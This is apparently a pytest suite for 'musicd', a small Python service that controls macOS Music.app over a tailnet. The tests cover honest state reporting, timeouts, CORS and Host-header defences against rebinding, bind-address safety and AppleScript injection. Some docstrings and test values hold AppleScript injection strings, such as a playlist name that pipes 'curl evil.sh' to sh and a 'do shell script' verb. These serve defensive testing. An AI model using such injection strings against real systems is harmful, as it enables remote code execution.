"""musicd: the three answers must stay three, and nothing may hang.

`scripts/musicd.py` replaces 14 Tauri `invoke()` calls into AppleScript with
one small tailnet service, because AppleScript does not exist in a browser and
the PWA's music widget would otherwise render a play button that does nothing.

The Rust it replaces has two defects that these tests exist to keep out of the
port, and both are in `nexus/src-tauri/src/lib.rs`:

  1. **One answer for six situations.** `music_get_state` returns the identical
     `default` struct — `playing: false, track: "", volume: 50` — for Music not
     running, osascript failing, the script's own error branch, player state
     `stopped`, a short response, and an untrusted webview (lib.rs:380-457). So
     the widget cannot tell "Music is closed" from "nothing is playing" from
     "I could not ask", and one of the fields is a number nobody measured.
  2. **No timeout anywhere.** `run_osascript` uses `Command::output()`
     (lib.rs:364-374), which waits forever. `osascript` blocks indefinitely
     against a Music.app that is mid-dialog, and a blocked request handler with
     no deadline takes the whole service down while launchd still reports it
     healthy.

Nothing here needs Music.app, a Mac, or a network. The `osascript` runner is
the single injected seam, and the HTTP handler is driven through a fake socket
— no port is bound, so a test cannot pass by accidentally talking to the real
service or the real Music.

Each test names the failure it prevents. A test whose failure mode nobody can
state is a test nobody will fix correctly.
"""

from __future__ import annotations

import importlib.util
import io
import json
import re
import subprocess
import threading
import time
import types
from pathlib import Path
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parents[3]

# The Tauri app musicd ports from. Outside this repo and READ ONLY; the one
# test that reads it skips when it is absent, so the suite stays green on a
# machine that has never checked nexus out.
NEXUS_LIB_RS = ROOT.parent.parent / "nexus" / "src-tauri" / "src" / "lib.rs"


def _load():
    """Import scripts/musicd.py by path — it is a script, not a package member."""
    spec = importlib.util.spec_from_file_location("musicd", ROOT / "scripts" / "musicd.py")
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


musicd = _load()


# ── the injected seam ─────────────────────────────────────────────────────


def fake_runner(*results: object, record: list[tuple[str, float]] | None = None) -> Any:
    """An `osascript` stand-in. Each call consumes the next scripted result.

    A result may be an `Osa`, or an exception instance to raise. The last one
    repeats forever, so a test that only cares about the state call does not
    have to also script the liveness call.
    """
    queue = list(results)

    def run(script: str, timeout: float) -> Any:
        if record is not None:
            record.append((script, timeout))
        item = queue.pop(0) if len(queue) > 1 else queue[0]
        if isinstance(item, BaseException):
            raise item
        return item

    return run


def osa_ok(out: str) -> Any:
    return musicd.Osa(True, out, "", "")


def osa_fail(reason: str, detail: str = "") -> Any:
    return musicd.Osa(False, "", reason, detail)


RUNNING = osa_ok("true")
NOT_RUNNING = osa_ok("false")

# A well-formed reply from STATE_SCRIPT: 10 ||-joined fields.
GOOD = "true||Bloom||Radiohead||The King of Limbs||41.5||328.0||false||off||62||true"


@pytest.fixture(autouse=True)
def _isolate(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """No test may write to the real var/musicd.log or read the real env."""
    monkeypatch.setattr(musicd, "LOG", tmp_path / "musicd.log")
    for var in ("MUSICD_BIND", "MUSICD_PORT", "MUSICD_ALLOWED_HOSTS",
                "MUSICD_ALLOW_ANY_INTERFACE"):
        monkeypatch.delenv(var, raising=False)


# ── the fake socket, so no test binds a port ──────────────────────────────


class _Sock:
    """A socket that is not a socket: request bytes in, response bytes out.

    Prevents the failure where an HTTP test quietly needs a listening port and
    then fails in CI, or worse, succeeds against something else already on it.
    `BaseHTTPRequestHandler` sets `wbufsize = 0`, so writes arrive via
    `sendall` rather than through a buffered file object.
    """

    def __init__(self, raw: bytes) -> None:
        self._in = io.BytesIO(raw)
        self.out = bytearray()

    def makefile(self, mode: str, _bufsize: int = -1) -> io.BytesIO:
        return self._in if "r" in mode else io.BytesIO()

    def sendall(self, data: bytes) -> None:
        self.out += data

    def settimeout(self, _t: float | None) -> None:
        pass

    def setsockopt(self, *_a: object) -> None:
        pass

    def close(self) -> None:
        pass


class Response:
    def __init__(self, raw: bytes) -> None:
        head, _, body = raw.partition(b"\r\n\r\n")
        lines = head.decode("latin-1").splitlines()
        self.status = int(lines[0].split()[1])
        self.headers = {
            k.strip().lower(): v.strip()
            for k, _, v in (line.partition(":") for line in lines[1:])
        }
        self.body = body
        try:
            self.json: dict[str, Any] = json.loads(body)
        except ValueError:
            self.json = {}


def request(
    method: str,
    path: str,
    *,
    hosts: set[str] | None = None,
    headers: dict[str, str] | None = None,
    host: str | None = "musicd.test",
    body: bytes = b"",
) -> Response:
    """Drive the real handler over a fake socket. Binds nothing."""
    hdrs = {"Host": host} if host is not None else {}
    hdrs.update(headers or {})
    if body:
        hdrs["Content-Length"] = str(len(body))
    raw = f"{method} {path} HTTP/1.1\r\n".encode()
    raw += b"".join(f"{k}: {v}\r\n".encode() for k, v in hdrs.items())
    raw += b"\r\n" + body

    allow = frozenset(hosts if hosts is not None else {"musicd.test", "127.0.0.1"})

    class Handler(musicd.MusicHandler):
        hosts = allow

    sock = _Sock(raw)
    server = types.SimpleNamespace(server_name="musicd.test", server_port=8731)
    Handler(sock, ("127.0.0.1", 51234), server)  # __init__ runs the whole exchange
    return Response(bytes(sock.out))


# ══════════════════════════════════════════════════════════════════════════
# 1. The organising principle: absence of evidence must not render as success
# ══════════════════════════════════════════════════════════════════════════


def test_music_not_running_is_distinguishable_from_nothing_playing(monkeypatch) -> None:
    """The defect this whole service exists to not reproduce.

    The Rust returns the same `default` struct for Music-closed and
    player-state-stopped (lib.rs:393-452), so the widget shows an identical
    blank paused player either way and the user cannot tell a dead integration
    from a quiet one. These two answers must differ in the field a client
    branches on, not merely somewhere in the payload.
    """
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(NOT_RUNNING))
    absent = musicd.read_state()

    monkeypatch.setattr(
        musicd, "run_osascript", fake_runner(RUNNING, osa_ok("stopped||||||||||"))
    )
    quiet = musicd.read_state()

    assert absent["state"] == "not-running"
    assert quiet["state"] == "stopped"
    assert absent["state"] != quiet["state"], "the two states collapsed into one"

    # And neither is dressed up as a real track.
    for payload in (absent, quiet):
        assert payload["track"] is None
        assert payload["reason"] is None, "both are determinate — there is nothing to explain"

    # The Rust's `default` claims `volume: 50` here (lib.rs:389) for situations
    # where it never asked. A fabricated number is worse than a null, because
    # a null cannot be plotted.
    assert absent["volume"] is None
    assert quiet["volume"] is None


def test_cannot_tell_is_a_third_state_not_a_flavour_of_nothing_playing(monkeypatch) -> None:
    """"I could not ask" must never share a shape with "nothing is playing".

    This is the one that matters most: if a hung or unauthorised Music.app
    reports as `stopped`, the widget renders a plausible idle player forever
    and nothing anywhere says why. Six situations, one answer, no diagnosis —
    exactly lib.rs:437-457.
    """
    monkeypatch.setattr(
        musicd, "run_osascript", fake_runner(RUNNING, osa_fail("osascript-timeout", "hung"))
    )
    unknown = musicd.read_state()

    monkeypatch.setattr(
        musicd, "run_osascript", fake_runner(RUNNING, osa_ok("stopped||||||||||"))
    )
    quiet = musicd.read_state()

    assert unknown["state"] == "unknown"
    assert unknown["reason"] == "osascript-timeout"
    assert unknown["state"] != quiet["state"]

    # `playing: False` is a claim. We are not entitled to it when we did not ask.
    assert unknown["playing"] is None
    assert quiet["playing"] is False

    # And a client that only checks `response.ok` must still not be fooled.
    assert musicd.http_status(unknown) == 503
    assert musicd.http_status(quiet) == 200
    assert musicd.http_status(unknown) != 500, "nothing here is broken; 500 would be a lie"


def test_system_events_failing_is_not_reported_as_music_being_closed(monkeypatch) -> None:
    """The most tempting wrong answer in the whole file.

    If the liveness probe itself cannot run, "Music is not running" is an
    available, plausible, and false answer — and it is indistinguishable from
    the real thing. `probe_running` returns None so the caller is forced to
    handle it, and returns the reason alongside so a hang still reads as one.
    """
    monkeypatch.setattr(
        musicd, "run_osascript", fake_runner(osa_fail("osascript-failed", "boom"))
    )
    assert musicd.probe_running()[0] is None
    assert musicd.read_state()["state"] == "unknown"

    # A non-boolean answer from System Events is also "cannot tell", not False.
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(osa_ok("Music")))
    running, why = musicd.probe_running()
    assert running is None
    assert why.reason == "unparseable-response"

    # And a liveness call that times out must say "timeout", not "failed":
    # the reason is the only part of this the user can act on.
    monkeypatch.setattr(
        musicd, "run_osascript", fake_runner(osa_fail("osascript-timeout", "hung"))
    )
    assert musicd.read_state()["reason"] == "osascript-timeout"


def test_unparseable_numbers_become_null_rather_than_zero(monkeypatch) -> None:
    """A playhead at 0.0 that nobody measured is a wrong fact.

    The Rust does `.parse().unwrap_or(0.0)` (lib.rs:464-468), so a position
    Music did not report renders as a scrubber snapped to the start of the
    track — a confident, specific, false claim.
    """
    row = "true||T||A||Al||not-a-number||also-not||false||off||loud||false"
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(RUNNING, osa_ok(row)))
    state = musicd.read_state()
    assert state["state"] == "playing", "an unreadable number must not void the track"
    assert state["track"] == "T"
    assert state["position"] is None
    assert state["duration"] is None
    assert state["volume"] is None


def test_the_automation_grant_refusal_gets_its_own_actionable_reason(monkeypatch) -> None:
    """Observed on the real machine, not imagined — and it arrives twice.

    With Music.app running, `osascript` was refused with `Not authorized to
    send Apple events to Music. (-1743)`: TCC had not granted Automation
    access to the calling process. A launchd job is a different parent from a
    terminal, so an installed musicd hits this even when your shell does not.

    It arrives as a non-zero exit with the number on stderr, *and* as exit 0
    with the message on stdout when `STATE_SCRIPT`'s own `on error`
    (lib.rs:431) catches it first — the second is the one a real deployment
    sees, and a returncode check alone never sees it at all. Folding it into a
    generic error loses the only thing the user can act on: it is fixed in
    System Settings, not in this repo.
    """
    on_stdout = osa_ok("error: Not authorized to send Apple events to Music.")
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(RUNNING, on_stdout))
    assert musicd.read_state()["reason"] == "osascript-not-permitted"

    on_stderr = osa_fail("osascript-not-permitted", "execution error: ... (-1743)")
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(RUNNING, on_stderr))
    assert musicd.read_state()["reason"] == "osascript-not-permitted"

    assert musicd.is_not_permitted("blah (-1743)") is True
    assert musicd.is_not_permitted("Not authorized to send Apple events to Music.") is True
    assert musicd.is_not_permitted("Can't get current track") is False


# ══════════════════════════════════════════════════════════════════════════
# 2. Every osascript call times out
# ══════════════════════════════════════════════════════════════════════════


def test_every_osascript_call_passes_a_timeout_to_subprocess(monkeypatch) -> None:
    """The load-bearing line. Without it the service dies of one hung call.

    `osascript` blocks indefinitely when Music.app is mid-dialog, and the Rust
    original has no deadline at all (`Command::output()`, lib.rs:364-374). A
    request handler with no timeout is an outage that launchd reports as
    healthy — the exact shape of the hub's six-hour one.

    Asserted on the actual kwarg rather than on behaviour, because the
    behavioural version of this test would have to hang to fail.
    """
    seen: list[dict[str, Any]] = []

    def spy(argv: list[str], **kwargs: Any) -> Any:
        seen.append(kwargs)
        return subprocess.CompletedProcess(argv, 0, "true", "")

    monkeypatch.setattr(musicd.subprocess, "run", spy)

    musicd.run_osascript("tell application \"Music\" to playpause", 4.0)
    assert seen[-1].get("timeout") == 4.0, "no timeout reached subprocess.run"

    # And no call site may omit it: the parameter has no default, so a new
    # caller that forgets is a TypeError at import-test time, not a hang in
    # production.
    with pytest.raises(TypeError):
        musicd.run_osascript("tell application \"Music\" to play")  # type: ignore[call-arg]

    # Exercise the real call sites through the spy, and require a positive,
    # finite deadline on every one of them.
    seen.clear()
    musicd.read_state()
    for verb in musicd.CONTROLS:
        musicd.send_control(verb)
    assert seen, "no osascript call was made"
    for kwargs in seen:
        timeout = kwargs.get("timeout")
        assert isinstance(timeout, (int, float)), f"a call ran with timeout={timeout!r}"
        assert 0 < timeout < 60


def test_a_timeout_is_answered_not_raised_and_does_not_hang(monkeypatch) -> None:
    """A hung Music.app must produce a fast honest 503, not a stuck handler.

    Two failures in one: an unhandled `TimeoutExpired` becomes a 500 and a
    traceback, and a handler that waits on the dead call never answers at all.
    """
    def boom(argv: list[str], **kwargs: Any) -> Any:
        raise subprocess.TimeoutExpired(argv, kwargs["timeout"])

    monkeypatch.setattr(musicd.subprocess, "run", boom)

    result = musicd.run_osascript("tell application \"Music\" to play", 5.0)
    assert result.ok is False
    assert result.reason == "osascript-timeout"
    assert "hung" in result.detail or "dialog" in result.detail

    started = time.monotonic()
    resp = request("GET", "/api/music")
    elapsed = time.monotonic() - started

    assert resp.status == 503
    assert resp.json["state"] == "unknown"
    assert resp.json["reason"] == "osascript-timeout"
    assert elapsed < 2.0, f"the handler took {elapsed:.1f}s — it is waiting on something"


def test_a_slow_call_yields_busy_rather_than_an_unbounded_thread_queue() -> None:
    """The second-order version of the hang, and the one that kills the process.

    The widget polls every couple of seconds. If each poll parks a thread
    behind a Music.app that never answers, the queue grows without limit until
    the process dies — the same outage with more steps, and per-call timeouts
    alone do not prevent it. So the lock is acquired *with* a deadline and a
    request that cannot get it answers honestly instead of queueing.

    Driven on a daemon thread on purpose. If the deadline is ever dropped, a
    blocking acquire would park this test forever and the suite would *hang*
    rather than fail — and a test that hangs reports nothing, blocks CI, and
    gets deleted by whoever is trying to ship. The join turns that into a
    named assertion failure.
    """
    box: dict[str, Any] = {}

    def attempt() -> None:
        started = time.monotonic()
        box["resp"] = request("GET", "/api/music")
        box["elapsed"] = time.monotonic() - started

    assert musicd._MUSIC_LOCK.acquire(timeout=1.0)
    worker = threading.Thread(target=attempt, daemon=True)
    try:
        worker.start()
        worker.join(timeout=musicd.LOCK_TIMEOUT + 5.0)
    finally:
        musicd._MUSIC_LOCK.release()

    assert not worker.is_alive(), (
        "the request never returned — the lock was acquired without a deadline, "
        "so every poll against a hung Music.app parks a thread forever"
    )
    resp, elapsed = box["resp"], box["elapsed"]
    assert resp.status == 503
    assert resp.json["reason"] == "busy"
    assert elapsed < musicd.LOCK_TIMEOUT + 1.5, "the request queued instead of giving up"
    # It waited, rather than failing instantly — otherwise the lock would turn
    # every concurrent poll into a spurious error.
    assert elapsed >= musicd.LOCK_TIMEOUT * 0.5


def test_healthz_never_shells_out(monkeypatch) -> None:
    """A liveness check that can hang is not a liveness check.

    If `/healthz` asked Music.app anything, the one failure this file is about
    would make the monitor time out too — and then a hung Music.app would read
    as a dead service, which is a different alarm sent to a different person.
    """
    def forbidden(*_a: object, **_k: object) -> Any:
        raise AssertionError("/healthz ran osascript")

    monkeypatch.setattr(musicd, "run_osascript", forbidden)
    resp = request("GET", "/healthz")
    assert resp.status == 200
    assert resp.json["ok"] is True
    # And it must not be mistakable for a statement about Music.
    assert resp.json["checks_music"] is False


# ══════════════════════════════════════════════════════════════════════════
# 3. A malformed response must not crash the handler
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    "reply",
    [
        "",                                    # empty stdout
        "true",                                # no separators at all
        "true||T||A",                          # truncated
        "error: Can't get current track.",     # the script's own error branch
        "true||T||A||Al||1||2||false||off||50",          # 9 fields: one short
        "true||T||A||Al||1||2||false||off||50||true||x",  # 11: one too many
        "\x00\x01garbage",                     # not text at all
        "stopped",                             # the sentinel, partially written
    ],
)
def test_a_malformed_applescript_response_answers_rather_than_crashing(
    reply: str, monkeypatch
) -> None:
    """A handler that raises on bad input is a 500 and a traceback in the log.

    AppleScript is a stringly-typed channel: a track title containing `||`, a
    truncated pipe, a localised error message. Every one of these must come
    back as a well-formed JSON answer the client can branch on.
    """
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(RUNNING, osa_ok(reply)))

    state = musicd.read_state()
    assert state["state"] in {"unknown", "stopped"}
    assert set(state) == set(musicd._unknown("x")), "the payload shape drifted"

    resp = request("GET", "/api/music")
    assert resp.status in (200, 503)
    assert resp.headers["content-type"] == "application/json"
    assert json.loads(resp.body), "the handler returned a body that is not JSON"


def test_an_extra_field_is_refused_rather_than_silently_misaligned(monkeypatch) -> None:
    """Wrong data presented as right — the worst of the available outcomes.

    The Rust accepts any length >= 10 and then indexes positionally
    (lib.rs:454-470), so a track titled `Say It ||Again` shifts every
    subsequent field by one: the album lands in `artist`, the position in
    `album`, and the widget displays it all with total confidence. Refusing to
    guess costs one real track rendering as `unknown`, which is the correct
    trade here.
    """
    shifted = "true||Say It ||Again||Anita||Blue Light||1||2||false||off||50||true"
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(RUNNING, osa_ok(shifted)))
    state = musicd.read_state()
    assert state["state"] == "unknown"
    assert state["reason"] == "unparseable-response"
    assert state["artist"] is None, "a shifted field was presented as an artist"


def test_a_well_formed_response_is_parsed_the_way_the_rust_parsed_it(monkeypatch) -> None:
    """The happy path, pinned. A port that drops a field is a silent regression.

    Field order is positional and comes from the AppleScript's `&` join
    (lib.rs:430); getting it wrong swaps artist and album, which looks fine
    until you read it.
    """
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(RUNNING, osa_ok(GOOD)))
    s = musicd.read_state()
    assert s["state"] == "playing"
    assert s["playing"] is True
    assert (s["track"], s["artist"], s["album"]) == ("Bloom", "Radiohead", "The King of Limbs")
    assert (s["position"], s["duration"]) == (41.5, 328.0)
    assert (s["shuffle"], s["repeat_mode"], s["volume"], s["loved"]) == (False, "off", 62, True)
    assert s["reason"] is None

    # `paused` is derived from the isPlaying boolean, because the script does
    # not return the player state itself. The Rust threw this away entirely by
    # keeping only `playing: bool`, so its UI could not label a paused player.
    monkeypatch.setattr(
        musicd, "run_osascript", fake_runner(RUNNING, osa_ok(GOOD.replace("true||", "false||", 1)))
    )
    assert musicd.read_state()["state"] == "paused"


# ══════════════════════════════════════════════════════════════════════════
# 4. Writes are not reachable by a GET
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize("verb", sorted(musicd.CONTROLS))
def test_a_mutating_verb_is_refused_over_get(verb: str, monkeypatch) -> None:
    """A mutation behind GET is one a link or a prefetch can fire.

    `GET /api/music/next` is reachable from an `<img src>`, a link preview, a
    chat client unfurling a URL, or Safari's speculative loader — none of
    which anybody clicked. It must be a 405 that names the right method, and
    it must not reach osascript at all.
    """
    def forbidden(*_a: object, **_k: object) -> Any:
        raise AssertionError(f"GET /api/music/{verb} executed osascript")

    monkeypatch.setattr(musicd, "run_osascript", forbidden)

    resp = request("GET", f"/api/music/{verb}")
    assert resp.status == 405, f"GET /api/music/{verb} was not refused"
    assert resp.headers.get("allow") == "POST"

    # Not in the read map either — that is where such a route would be added
    # by accident.
    assert f"/api/music/{verb}" not in musicd.READ_PATHS


def test_a_post_with_the_guard_header_actually_works(monkeypatch) -> None:
    """The other half: refusing GET is worthless if POST is broken too.

    A control that always refuses is the inert button this service replaces,
    just with a better status code.
    """
    record: list[tuple[str, float]] = []
    monkeypatch.setattr(
        musicd, "run_osascript", fake_runner(RUNNING, osa_ok(""), record=record)
    )
    resp = request("POST", "/api/music/next", headers={"X-Trainwatch": "1"})
    assert resp.status == 200
    assert resp.json["state"] == "ok"
    assert resp.json["verb"] == "next"
    assert any("next track" in script for script, _ in record), "the verb never ran"


def test_a_post_without_the_guard_header_is_refused(monkeypatch) -> None:
    """ADR-0003 C3: the custom header forces a preflight we never answer.

    Without it, a cross-origin `fetch(..., {mode:"no-cors"})` is a *simple*
    request — no preflight is sent, the browser fires it, and the write lands.
    C2's Origin check is absent on a request with no Origin, so this is the
    belt that holds when the braces are missing.
    """
    def forbidden(*_a: object, **_k: object) -> Any:
        raise AssertionError("an unguarded POST reached osascript")

    monkeypatch.setattr(musicd, "run_osascript", forbidden)
    resp = request("POST", "/api/music/next")
    assert resp.status == 403
    assert musicd.GUARD_HEADER in resp.json["error"]


def test_a_cors_preflight_is_refused_rather_than_answered() -> None:
    """ADR-0003 C4. Answering politely would undo C3.

    Emitting `Access-Control-Allow-*` is what lets another origin both send
    the real write and read the response body.
    """
    resp = request("OPTIONS", "/api/music/next", headers={"Origin": "https://evil.example"})
    assert resp.status == 403
    assert not [h for h in resp.headers if h.startswith("access-control-")]

    # OPTIONS goes through the Host allowlist like every other method — pinned
    # because "guarded everywhere except the one method nobody thought about"
    # is how a guard develops a hole, and an unguarded verb is a route that
    # answers requests a rebinding attack can make.
    blind = request("OPTIONS", "/api/music/next", host="evil.example")
    assert blind.status == 421, "OPTIONS skipped the Host allowlist"


def test_no_response_ever_carries_a_cors_header(monkeypatch) -> None:
    """One missing header is the difference between private and public.

    Without `Access-Control-Allow-Origin` the browser withholds the body from
    any other origin, which is what stops a random web page reading what you
    are listening to and which device it is on.
    """
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(RUNNING, osa_ok(GOOD)))
    for method, path, hdrs in (
        ("GET", "/api/music", {}),
        ("GET", "/healthz", {}),
        ("GET", "/api/music/next", {}),
        ("GET", "/nope", {}),
        ("POST", "/api/music/next", {"X-Trainwatch": "1"}),
    ):
        resp = request(method, path, headers=hdrs)
        assert not [h for h in resp.headers if h.startswith("access-control-")], (
            f"{method} {path} leaked a CORS header"
        )
        assert resp.headers.get("x-content-type-options") == "nosniff"


def test_an_unrecognised_host_header_is_rejected(monkeypatch) -> None:
    """ADR-0003 C1. The only control that actually defeats DNS rebinding.

    `evil.com` re-resolves to the tailnet IP with a 1-second TTL; the browser
    still believes the page is same-origin with `evil.com`, so same-origin
    policy stops protecting the response. The rebinding request must carry
    `Host: 100.x.y.z`, and a browser cannot forge `Host` — so the allowlist is
    the whole defence. An absent Host is rejected too: `if host and ...` would
    let any non-browser client skip C1 by simply omitting the header.
    """
    def forbidden(*_a: object, **_k: object) -> Any:
        raise AssertionError("a rejected Host still reached osascript")

    monkeypatch.setattr(musicd, "run_osascript", forbidden)

    for host in ("evil.example", "100.99.99.99", ""):
        resp = request("GET", "/api/music", host=host or None)
        assert resp.status == 421, f"Host={host!r} was not rejected"
        assert "rebinding" in resp.json["why"].lower()

    # A cross-origin Origin on an allowlisted Host is CSRF (C2), and refused
    # separately.
    resp = request("POST", "/api/music/next",
                   headers={"Origin": "https://evil.example", "X-Trainwatch": "1"})
    assert resp.status == 403
    assert "cross-origin" in resp.json["error"]


# ══════════════════════════════════════════════════════════════════════════
# 5. The bind address is what the docstring claims
# ══════════════════════════════════════════════════════════════════════════


def test_the_bind_address_is_the_tailnet_ip_and_never_the_wildcard(monkeypatch) -> None:
    """An unauthenticated endpoint that controls your Mac, on every interface.

    `0.0.0.0` also binds café wifi, a hotel LAN, and any interface bridged
    later by something else. The tailnet IP binds exactly one encrypted
    interface, which is the safest option that still reaches the iPad — and
    reaching the iPad is the entire point, so loopback cannot be the default.
    """
    monkeypatch.setattr(musicd, "_tailnet_ipv4", lambda: "100.102.190.111")
    host, why = musicd.resolve_bind()
    assert host == "100.102.190.111"
    assert "tailscale" in why

    # No tailscale: fall back to loopback — unreachable rather than wide open —
    # and say so, because a service that silently stops being reachable gets
    # reported as a bug in the PWA.
    monkeypatch.setattr(musicd, "_tailnet_ipv4", lambda: "")
    host, why = musicd.resolve_bind()
    assert host == "127.0.0.1"
    assert "loopback" in why and "nothing off this Mac" in why

    # The wildcard is not in the fallback order at all, under any conditions.
    for tailnet in ("100.102.190.111", ""):
        monkeypatch.setattr(musicd, "_tailnet_ipv4", lambda t=tailnet: t)
        assert musicd.resolve_bind()[0] != musicd.WILDCARD


def test_the_wildcard_is_refused_even_when_asked_for_explicitly(monkeypatch) -> None:
    """"Without thought" is the failure — so it costs a documented env var.

    A `--bind 0.0.0.0` that just works is one somebody copies out of a gist at
    2am. The refusal has to explain itself, or it is a puzzle rather than a
    guard.
    """
    monkeypatch.setattr(musicd, "_tailnet_ipv4", lambda: "100.102.190.111")

    for wildcard in (musicd.WILDCARD, "::"):
        with pytest.raises(SystemExit) as caught:
            musicd.resolve_bind(wildcard)
        message = str(caught.value)
        assert "refusing to bind" in message
        assert "unauthenticated" in message
        assert musicd.ANY_INTERFACE_ENV in message, "the refusal does not say how to override"

    # And the override works, so the guard is a speed bump rather than a wall.
    monkeypatch.setenv(musicd.ANY_INTERFACE_ENV, "1")
    host, why = musicd.resolve_bind(musicd.WILDCARD)
    assert host == musicd.WILDCARD
    assert musicd.ANY_INTERFACE_ENV in why


def test_the_docstring_claims_what_the_code_does(monkeypatch) -> None:
    """The brief's actual requirement: state the bind in the docstring.

    A docstring that drifts from the code is worse than none — it is the thing
    someone reads instead of the code. So the claim is asserted against the
    behaviour rather than trusted.
    """
    doc = musicd.__doc__ or ""
    assert "tailscale ip -4" in doc, "the docstring does not say how the bind is found"
    assert re.search(r"[Nn]ever\s+`?0\.0\.0\.0`?", doc), "the docstring does not refuse the wildcard"
    assert str(musicd.DEFAULT_PORT) in doc, "the docstring does not state the port"

    monkeypatch.setattr(musicd, "_tailnet_ipv4", lambda: "100.64.1.2")
    assert musicd.resolve_bind()[0] == "100.64.1.2"


def test_the_host_allowlist_is_the_hubs_and_is_never_a_wildcard() -> None:
    """Two allowlists is one allowlist that is wrong.

    `resolve_allowed_hosts` in `src/trainwatch/security.py` already derives
    localhost plus this machine's tailnet IPs and MagicDNS names, and is
    stdlib-only. Borrowing it means musicd and the hub agree by construction;
    a hand-copied second list goes stale the first time an address changes and
    the failure looks like a mysterious 421.
    """
    from src.trainwatch.security import resolve_allowed_hosts

    assert callable(resolve_allowed_hosts), "the borrowed helper moved or was renamed"

    hosts = musicd.allowed_hosts("100.102.190.111")
    assert "100.102.190.111" in hosts
    assert "localhost" in hosts and "127.0.0.1" in hosts
    assert "*" not in hosts and "" not in hosts

    # An unbracketed IPv6 authority is malformed and must resolve to "", so the
    # guard rejects it rather than matching a prefix of it.
    assert musicd.host_only("[::1]:8731") == "[::1]"
    assert musicd.host_only("100.102.190.111:8731") == "100.102.190.111"
    assert musicd.host_only("  ") == ""


def test_serving_never_happens_by_accident(capsys, monkeypatch) -> None:
    """Running the script with no arguments must not open a control port.

    `python3 scripts/musicd.py` is what someone types to see what it does.
    Making that bind an unauthenticated endpoint that controls the Mac is a
    footgun with no upside, so `--serve` is explicit and `--once` is default.
    """
    flags = {opt for action in musicd.build_parser()._actions for opt in action.option_strings}
    assert {"--once", "--serve", "--install", "--where", "--bind"} <= flags

    # With no flags, `main` must take the `once()` path — which binds nothing.
    # Asserted by running it with a runner that cannot reach a real Music.app
    # and a bind resolver that would be a red flag if consulted.
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(NOT_RUNNING))
    monkeypatch.setattr(
        musicd,
        "make_server",
        lambda *a, **k: pytest.fail("a bare invocation opened a control port"),
    )
    assert musicd.main([]) == 0
    assert json.loads(capsys.readouterr().out)["state"] == "not-running"


# ══════════════════════════════════════════════════════════════════════════
# 6. The port itself: the AppleScript must not have been re-derived
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.skipif(not NEXUS_LIB_RS.exists(), reason="the nexus checkout is not present")
def test_the_applescript_is_byte_for_byte_what_the_rust_ran() -> None:
    """Re-deriving working AppleScript is how a port introduces bugs.

    The dialect in `lib.rs` is known to work against a real Music.app —
    including the `loved` / `favorited` fallback for newer Music versions and
    the `stopped||||||||||` sentinel, both of which are non-obvious and both of
    which a rewrite would drop. This pins the copy to the original for as long
    as the nexus checkout exists to compare against.
    """
    rust = NEXUS_LIB_RS.read_text(encoding="utf-8")

    for line in musicd.STATE_SCRIPT.strip().splitlines():
        assert line in rust, f"this line is not in lib.rs — it was rewritten:\n  {line}"

    assert musicd.IS_RUNNING_SCRIPT in rust

    # Matched against the *closing* delimiter of the Rust raw string (`"#`),
    # not as a bare substring. Without that, `tell application "Music" to play`
    # matches inside `... to play playlist "{}"` and the assertion below would
    # pass for the wrong reason — a one-line script is a prefix of a longer one.
    def literal(verb: str) -> str:
        return musicd.CONTROLS[verb] + '"#'

    # The three verbs the Rust actually shipped, verbatim.
    for verb in ("playpause", "next", "previous"):
        assert literal(verb) in rust, f"{verb} was not ported verbatim"

    # `play` and `pause` are additions — the Rust only had the toggle — so they
    # are deliberately NOT expected in lib.rs. Asserted so the difference is
    # recorded rather than discovered.
    assert literal("play") not in rust
    assert literal("pause") not in rust


def test_no_control_script_interpolates_a_caller_value() -> None:
    """AppleScript injection, which the Rust is open to and this is not.

    `music_play_playlist` builds its script with `format!` and a caller-supplied
    name (lib.rs:562), as does `music_set_volume` (lib.rs:569). A playlist named
    `" & (do shell script "curl evil.sh | sh") & "` runs as you. Those verbs are
    not ported; this test is what makes that a decision rather than an
    oversight, and it fails the moment someone adds a formatted verb.
    """
    for verb, script in musicd.CONTROLS.items():
        assert "{" not in script and "%" not in script, f"{verb} looks interpolated"
    # The dispatcher looks verbs up in a fixed table; the path is never spliced
    # into a script.
    assert musicd.send_control.__doc__
    with pytest.raises(KeyError):
        musicd.send_control('shutdown" & (do shell script "id") & "')


def test_an_unknown_control_verb_is_a_404_not_an_execution(monkeypatch) -> None:
    """The dispatcher must not be a shell.

    A path segment reaching `osascript` — however it got there — is remote code
    execution on an unauthenticated port.
    """
    def forbidden(*_a: object, **_k: object) -> Any:
        raise AssertionError("an unknown verb reached osascript")

    monkeypatch.setattr(musicd, "run_osascript", forbidden)
    for path in ("/api/music/quit", "/api/music/", "/api/music/next/../quit", "/etc/passwd"):
        resp = request("POST", path, headers={"X-Trainwatch": "1"})
        assert resp.status in (404, 405), f"{path} returned {resp.status}"


def test_a_control_against_a_closed_music_app_says_so_and_does_not_launch_it(
    monkeypatch,
) -> None:
    """Two failures: a fake success, and a POST that starts an application.

    `open -a Music` from an unauthenticated port is a larger authority than
    skipping a track, and reporting `ok` when nothing was sent is the inert
    button again — this time lying about it.
    """
    record: list[tuple[str, float]] = []
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(NOT_RUNNING, record=record))

    resp = request("POST", "/api/music/play", headers={"X-Trainwatch": "1"})
    assert resp.status == 200
    assert resp.json["state"] == "not-running"
    assert resp.json["state"] != "ok", "a no-op reported success"
    assert len(record) == 1, "it talked to Music after learning Music was closed"
    assert all("open" not in script for script, _ in record)


def test_install_prints_a_plist_and_writes_nothing(capsys, monkeypatch) -> None:
    """An installer that guesses produces a job that runs and cannot work.

    The bind depends on tailscale being up at load time and Automation access
